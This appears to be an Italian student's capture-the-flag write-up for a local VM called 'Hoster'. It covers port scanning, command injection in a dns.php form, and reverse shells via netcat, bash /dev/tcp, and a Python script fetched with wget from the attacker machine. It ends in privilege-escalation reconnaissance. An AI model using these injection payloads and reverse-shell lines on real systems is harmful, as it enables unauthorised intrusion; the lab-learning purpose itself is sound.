#+title: VDSI - Hoster
#+author: Andrea Pepe
#+date: 27/05/2022

* Foothold
** Subnet scanning
Essendo la macchina target una VM che runna in locale, c'è bisogno di
fare uno scan della sottorete per individuare l'indirizzo IP della
macchina target. Lo facciamo tramite *nmap*:
#+begin_example
$ sudo nmap -Pn 192.168.56.101/24

sudo: impossibile risolvere l'host roronoa: Errore temporaneo nella risoluzione del nome
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 17:31 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.00024s latency).
All 1000 scanned ports on 192.168.56.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 0A:00:27:00:00:03 (Unknown)

Nmap scan report for 192.168.56.100
Host is up (0.000099s latency).
All 1000 scanned ports on 192.168.56.100 are in ignored states.
Not shown: 1000 filtered tcp ports (proto-unreach)
MAC Address: 08:00:27:F7:E0:61 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.103
Host is up (0.00078s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E1:BF:F8 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.0000060s latency).
All 1000 scanned ports on 192.168.56.101 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (4 hosts up) scanned in 10.40 seconds
#+end_example

L'indirizzo IP della macchina target è *192.168.56.103* e lo associamo
al nome *hoster* nel file */etc/hosts*.
** nmap
*** tcp
#+begin_example
$ nmap -sC -sV hoster                                                     1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 17:59 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for hoster (192.168.56.103)
Host is up (0.00092s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:6f:f4:ec:81:18:59:29:e7:60:08:93:14:18:ba:2e (RSA)
|   256 95:5e:dc:83:fe:e0:00:40:ee:a2:2e:2d:69:00:b0:1f (ECDSA)
|_  256 d8:c4:8d:12:f5:84:a9:80:0a:e8:31:8c:3a:a3:98:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Webifier Hosting and Domain Registration
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
#+end_example

#+begin_example
$ nmap -p- hoster                                                         1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 18:01 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 64.55% done; ETC: 18:03 (0:00:46 remaining)
Nmap scan report for hoster (192.168.56.103)
Host is up (0.0020s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds
#+end_example

*** udp
#+begin_example
$ sudo nmap -sU 192.168.56.103
sudo: impossibile risolvere l'host roronoa: Errore temporaneo nella risoluzione del nome
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 18:01 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for hoster (192.168.56.103)
Host is up (0.00079s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT   STATE  SERVICE
22/udp closed ssh
80/udp closed http
MAC Address: 08:00:27:E1:BF:F8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.45 seconds
#+end_example
** http
Il servizio web sembra essere una piattaforma per hostare dei servizi
web a pagamento, con diversi piani di acquisto. Per due di essi (su 3,
l'altro è gratuito) è necessario registrarsi tramite un form http.
Tuttavia, non sembra esserci una pagina di login.

Tramite il plugin *Wappalyzer* vediamo che il web server è Apache e che
i linguaggi di programmazione utilizzati sono il *php* e lato client
viene fatto uso di *jquery*.

Proviamo dunque a fare una enumerazione sia di virtual hosts che di
directory alla ricerca di una eventuale pagina di login o qualsiasi
altra informazione utile. 

*** vhost enumeration
Da un'analisi effettuata tramite *gobuster* non sembrano esserci virtual
hosts.
#+begin_example
$ gobuster vhost -u http://192.168.56.103 -w ~/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-110000.txt 2>/dev/null                      1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://192.168.56.103
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/andrea/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/05/27 18:22:10 Starting gobuster in VHOST enumeration mode
===============================================================
===============================================================
2022/05/27 18:22:22 Finished
===============================================================
#+end_example


*** dir enumeration
#+begin_example
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hoster -x html,txt                                            130 ⨯ 1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hoster
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt
[+] Timeout:                 10s
===============================================================
2022/05/27 18:11:23 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 301] [--> http://hoster/images/]
/index.html           (Status: 200) [Size: 6386]                           
/css                  (Status: 301) [Size: 298] [--> http://hoster/css/]   
/js                   (Status: 301) [Size: 297] [--> http://hoster/js/]    
/server-status        (Status: 403) [Size: 294]                            
                                                                           
===============================================================
2022/05/27 18:11:57 Finished
===============================================================
#+end_example

#+begin_example
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hoster -x php                                                       1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hoster
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/05/27 18:12:06 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 301] [--> http://hoster/images/]
/css                  (Status: 301) [Size: 298] [--> http://hoster/css/]   
/js                   (Status: 301) [Size: 297] [--> http://hoster/js/]    
/dns.php              (Status: 200) [Size: 1546]                           
/server-status        (Status: 403) [Size: 294]                            
                                                                           
===============================================================
2022/05/27 18:12:34 Finished
===============================================================
#+end_example

Vediamo che di interessante c'è la pagina *server-status* a cui non è
possibile accedere perché non si posseggono i privilegi necessari;
inoltre, sembra molto interessante la pagina *dns.php*.
** command injection
La pagina *dns.php* si presenta come un form di post con l'output del
comando ~host~ e delle sue opzioni di utilizzo. Nel form di post è
possibile passare gli argomenti ad *host*.

Titolo: *Domain DNS Checker*
Input: *Input domain*
Submit: *Check*

#+begin_example
Usage: host [-aCdlriTwv] [-c class] [-N ndots] [-t type] [-W time]
            [-R number] [-m flag] hostname [server]
       -a is equivalent to -v -t ANY
       -c specifies query class for non-IN data
       -C compares SOA records on authoritative nameservers
       -d is equivalent to -v
       -l lists all hosts in a domain, using AXFR
       -i IP6.INT reverse lookups
       -N changes the number of dots allowed before root lookup is done
       -r disables recursive processing
       -R specifies number of retries for UDP packets
       -s a SERVFAIL response should stop query
       -t specifies the query type
       -T enables TCP/IP mode
       -v enables verbose output
       -w specifies to wait forever for a reply
       -W specifies how long to wait for a reply
       -4 use IPv4 query transport only
       -6 use IPv6 query transport only
       -m set memory debugging flag (trace|record|usage)
       -V print version number and exit
#+end_example

*** localhost
Se passiamo come parametro di input la parola ~localhost~, otteniamo il
seguente output:
#+begin_example
localhost has address 127.0.0.1
localhost has IPv6 address ::1
#+end_example

*** localhost; id
#+begin_example
host: couldn't get address for 'id': not found
#+end_example

Proviamo altri delimitatori.

*** localhost && id
#+begin_example
host: couldn't get address for 'id': not found
#+end_example

*** 10 || id
#+begin_example
uid=33(www-data) gid=33(www-data) groups=33(www-data)
#+end_example

Mandando in errore il primo comando (*host 10* va in errore) ed
utilizzando il delimitatore *||* viene eseguito il secondo comando e
abbiamo una *command injection*!

*** localhost | id
#+begin_example
uid=33(www-data) gid=33(www-data) groups=33(www-data)
#+end_example

La command injection c'è anche utilizzando la pipe come delimitatore
tra i comandi!
** www-data
Cerchiamo di esfiltrare informazioni utili per poter ottenere una
shell'all'interno della macchina target.

*** localhost | cat /etc/passwd
#+begin_example
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
web_8357243:x:1000:1000:web_8357243,,,:/home/web_8357243:/bin/bash
monitor:x:1001:1001::/monitoring:
#+end_example

Vediamo che ci sono due utenti interessanti:
*web_8357243* e *monitoring*.

*** localhost | ls -la /home
#+begin_example
total 12
drwxr-xr-x  3 root        root        4096 Jul 31  2019 .
drwxr-xr-x 25 root        root        4096 Sep 27  2019 ..
drwxr-xr-x  6 web_8357243 web_8357243 4096 Jun 16  2020 web_8357243
#+end_example

Vediamo che solo l'utente *web_8357243* è nella cartella /home, a cui
abbiamo diritto d'accesso in lettura, quindi vediamo se ci sono
delle credenziali ssh per connetterci alla macchina.

*** localhost | ls -la /home/web_8357243
#+begin_example
total 44
drwxr-xr-x 6 web_8357243 web_8357243 4096 Jun 16  2020 .
drwxr-xr-x 3 root        root        4096 Jul 31  2019 ..
lrwxrwxrwx 1 root        root           9 Dec  9  2019 .bash_history -> /dev/null
-rw-r--r-- 1 web_8357243 web_8357243  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 web_8357243 web_8357243 3771 Jul 31  2019 .bashrc
drwx------ 2 web_8357243 web_8357243 4096 Jun 16  2020 .cache
drwx------ 2 web_8357243 web_8357243 4096 Jun 16  2020 .gnupg
drwxrwxr-x 2 web_8357243 web_8357243 4096 Jul 31  2019 .nano
-rw-r--r-- 1 web_8357243 web_8357243  655 Jul 31  2019 .profile
drwx------ 2 web_8357243 web_8357243 4096 Sep 28  2019 .ssh
-rw-r--r-- 1 web_8357243 web_8357243    0 Jul 31  2019 .sudo_as_admin_successful
-rw------- 1 web_8357243 web_8357243  725 Jun 16  2020 .viminfo
-rw-rw-r-- 1 web_8357243 web_8357243   22 Jun 16  2020 flag.txt
#+end_example

Purtroppo non abbiamo i permessi d'accesso alla cartella *.ssh*.
Sfruttiamo quindi direttamente la command injection per ottenere una
reverse shell.
** reverse shell

*** make sure nc is present
Iniettando l'input ~localhost | which nc~, viene restituito in output:
#+begin_example
/bin/nc
#+end_example
Dunque, *netcat* è presente e possiamo sfruttarlo per ottenre una
reverse shell.

*** nc
Sulla macchina kali locale ci mettiamo in ascolto sulla porta 4321:
#+begin_example
$ nc -lvnp 4321
listening on [any] 4321 ...
#+end_example

Iniettiamo il comando nel form della pagina *dns.php*:
#+begin_example
localhost | nc 192.168.56.101 4321
#+end_example

Tuttavia, in questo modo, l'output del comando *host localhost* viene
inviato con netcat alla kali e la connessione viene chiusa
immediatamente.

Inserendo il comando per spawnare la shell, il messaggio di riotrno è
il seguente
#+begin_example
localhost | nc 192.168.56.101 4321 -e /bin/bash

nc: invalid option -- 'e'
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
	  [-x proxy_address[:port]] [destination] [port]
#+end_example
Proviamo a sfruttare l'altra command injection con il delimitatore *||*.

#+begin_example
10 || nc 192.168.56.101 4321 -e /bin/bash
#+end_example

Nulla, otteniamo lo stesso errore! La versione di *nc* installata sulla
macchina target non supporta il flag *-e*.

*** bash reverse shell
Optiamo quindi per ottenere una reverse shell direttamente in bash,
presa da [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp][PayloadAllTheThings]]:
#+begin_example
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
#+end_example

Iniettiamo quindi:
#+begin_example
10 || bash -i >& /dev/tcp/192.168.56.101/4321 0>&1
#+end_example

Non essendo fortunati nemmeno con questo, proviamo con una reverse
shell in python.

*** pyhton reverse shell
#+begin_example
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
#+end_example

Tuttavia, nemmeno questa strada sembra essere vincente. Il problema è
che vengono filtrati dei caratteri dall'input, quindi si cerca di
accedere al sorgente della pagina php per capire quali sono tali
caratteri.

*** dns.php source
Iniettando il seguente input
#+begin_example
10 || cat dns.php
#+end_example

si ottiene il codice della pagina *dns.php* ed è possibile vedere la
lista di caratteri filtrati nell'input:

#+begin_src php
<?php

$host = $_POST["name"]; 

// prevent command injection attacks
$host = str_ireplace(array('`',';','\\','\'','\"','#','>','&','[',']'), '', $host);

system("timeout 1 host $host 2>&1");

?>
#+end_src

Dunque, è di fatto impossibile ottenere una shell iniettando dei
comandi in modo diretto.
Si decide di creare un file in locale contenente i comandi per la
reverse shell e di sfruttare la *command injection* in 2 step:
- il primo step consiste nel caricare il file sulla macchina target
  facendola connettere ad un piccolo server create appositamente sulla
  macchina attaccante;
- il secondo step consiste nello sfruttare la command injection per
  eseguire il file caricato sulla macchina target (essendo la reverse
  shell in python, non è necessario dare i permessi di esecuzione al
  file caricato).

*** reverse shell loading on target machine
La reverse shell creata è contenuta nel file ~revshell.py~ contenente il
seguente codice python:

#+begin_src python
#!/usr/bin/python

import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.101",4321))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
#+end_src

Apriamo un piccolo server python in locale tramite il seguente
comando:
#+begin_example
$ python -m http.server 4444                                                            1 ⚙
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
#+end_example

Iniettiamo nel form HTTP quanto segue per far caricare il file nella
cartella */tmp* della macchina target (dopo esserci assicurati che il
comando wget sia disponibile):
#+begin_example
10 || wget http://192.168.56.101:4444/revshell.py -O /tmp/revshell.py
#+end_example

Otteniamo il seeguente output che ci indica che l'operazione è andata
a buon fine:
#+begin_example
--2022-05-28 09:39:10--  http://192.168.56.101:4444/revshell.py
Connecting to 192.168.56.101:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 213 [text/x-python]
Saving to: '/tmp/revshell.py'

     0K                                                       100% 91.5M=0s

2022-05-28 09:39:10 (91.5 MB/s) - '/tmp/revshell.py' saved [213/213]
#+end_example

Infine, ci mettiamo in ascolto sulla porta 4321 con *nc*:
#+begin_example
$ nc -lvnp 4321
listening on [any] 4321 ...
#+end_example

ed iniettiamo il comando per lanciare la reverse shell:
#+begin_example
10 || python /tmp/revshell.py
#+end_example

E come è possibile vedere, otteniamo una reverse shell:
#+begin_example
$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.103] 53084
$ whoami
whoami
www-data
#+end_example

* Privilege escalation
** shell upgrade
Eseguiamo un upgrade della shell per avere maggiori funzionalità:
#+begin_example
python -c "import pty;pty.spawn('/bin/bash')"
#+end_example
In questo modo, abbiamo ottenuto una shell in bash (piuttosto che in
sh).
#+begin_example
www-data@hoster:/var/www/html$ 
#+end_example

Adesso ,mettiamo il processo in background con *CTRL + Z* e modifichiamo
le impostazioni della riga di comando con *stty* e riportiamo il
processo in foreground:
#+begin_example
$ stty raw -echo && fg
#+end_example

In questo modo, abbiamo ottenuto varie funzionalità tra cui il potersi
muovere con le freccette up and down tra la command history e
l'autocomplete con il tasto TAB.

Ora, effettuaimo dei comandi sulla shell della macchina target per
ottenere dei colori e la possibilità di fare il clear:
#+begin_example
export SHELL=bash
export TERM=xterm-256color
#+end_example

** /etc/passwd
#+begin_example
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
web_8357243:x:1000:1000:web_8357243,,,:/home/web_8357243:/bin/bash
monitor:x:1001:1001::/monitoring:
#+end_example

** /home
#+begin_example
total 12
drwxr-xr-x  3 root        root        4096 Jul 31  2019 .
drwxr-xr-x 25 root        root        4096 Sep 27  2019 ..
drwxr-xr-x  6 web_8357243 web_8357243 4096 Jun 16  2020 web_8357243
#+end_example

** ls -la /home/web_8357243/
#+begin_example
total 44
drwxr-xr-x 6 web_8357243 web_8357243 4096 Jun 16  2020 .
drwxr-xr-x 3 root        root        4096 Jul 31  2019 ..
lrwxrwxrwx 1 root        root           9 Dec  9  2019 .bash_history -> /dev/null
-rw-r--r-- 1 web_8357243 web_8357243  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 web_8357243 web_8357243 3771 Jul 31  2019 .bashrc
drwx------ 2 web_8357243 web_8357243 4096 Jun 16  2020 .cache
drwx------ 2 web_8357243 web_8357243 4096 Jun 16  2020 .gnupg
drwxrwxr-x 2 web_8357243 web_8357243 4096 Jul 31  2019 .nano
-rw-r--r-- 1 web_8357243 web_8357243  655 Jul 31  2019 .profile
drwx------ 2 web_8357243 web_8357243 4096 Sep 28  2019 .ssh
-rw-r--r-- 1 web_8357243 web_8357243    0 Jul 31  2019 .sudo_as_admin_successful
-rw------- 1 web_8357243 web_8357243  725 Jun 16  2020 .viminfo
-rw-rw-r-- 1 web_8357243 web_8357243   22 Jun 16  2020 flag.txt
#+end_example

*** User flag
#+begin_example
VDSI{Y0u_G0t_uS3r!!!}
#+end_example

** ps aux
#+begin_example
www-data@hoster:/$ ps auxf
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    09:25   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [ksoftirqd/0]
root         4  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kworker/0:0]
root         5  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kworker/u4:0]
root         7  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [migration/0]
root        10  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [migration/1]
root        16  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kdevtmpfs]
root        20  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [netns]
root        21  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [khungtaskd]
root        22  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [oom_reaper]
root        23  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [writeback]
root        24  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kcompactd0]
root        25  0.0  0.0      0     0 ?        SN   09:25   0:00  \_ [ksmd]
root        26  0.0  0.0      0     0 ?        SN   09:25   0:00  \_ [khugepaged]
root        27  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [crypto]
root        28  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kintegrityd]
root        29  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        30  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kblockd]
root        31  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ata_sff]
root        32  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [md]
root        33  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [devfreq_wq]
root        34  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [watchdogd]
root        38  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kswapd0]
root        39  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [vmstat]
root        40  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [ecryptfs-kthrea]
root        79  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kthrotld]
root        80  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [acpi_thermal_pm]
root        81  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        82  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        83  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        84  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        85  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        86  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        87  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        88  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root        93  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ipv6_addrconf]
root       114  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [deferwq]
root       115  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [charger_manager]
root       157  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kpsmoused]
root       191  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [mpt_poll_0]
root       192  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [mpt/0]
root       195  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [scsi_eh_0]
root       196  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [scsi_tmf_0]
root       198  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root       300  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [raid5wq]
root       325  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [bioset]
root       354  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [jbd2/sda1-8]
root       355  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ext4-rsv-conver]
root       401  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kworker/1:1H]
root       412  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kauditd]
root       414  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [iscsi_eh]
root       428  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kworker/u5:0]
root       430  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ib-comp-wq]
root       431  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ib_addr]
root       432  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ib_mcast]
root       433  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ib_nl_sa_wq]
root       436  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ib_cm]
root       439  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [iw_cm_wq]
root       442  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [rdma_cm]
root       472  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kworker/0:4]
root       614  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [iprt-VBoxWQueue]
root       877  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [ttm_swap]
root       919  0.0  0.0      0     0 ?        S    09:25   0:00  \_ [kworker/1:7]
root      1155  0.0  0.0      0     0 ?        S<   09:25   0:00  \_ [kworker/0:1H]
root      1378  0.0  0.0      0     0 ?        S    09:32   0:00  \_ [kworker/u4:1]
root      1500  0.0  0.0      0     0 ?        S    09:40   0:00  \_ [kworker/1:0]
root         1  0.0  0.3  55192  7024 ?        Ss   09:25   0:00 /sbin/init
root       398  0.1  0.3  57320  6244 ?        Ss   09:25   0:02 /lib/systemd/systemd-journald
root       434  0.0  0.0  94840  1488 ?        Ss   09:25   0:00 /sbin/lvmetad -f
root       443  0.0  0.2  45176  4352 ?        Ss   09:25   0:00 /lib/systemd/systemd-udevd
systemd+   707  0.0  0.2 125508  4508 ?        Ssl  09:25   0:00 /lib/systemd/systemd-timesyncd
root       812  0.0  0.1  16104  2696 ?        Ss   09:25   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
syslog     889  0.0  0.1 256404  3396 ?        Ssl  09:25   0:00 /usr/sbin/rsyslogd -n
root       909  0.0  0.1  29820  3012 ?        Ss   09:25   0:00 /usr/sbin/cron -f
root       910  0.0  1.1 358012 22932 ?        Ssl  09:25   0:00 /usr/lib/snapd/snapd
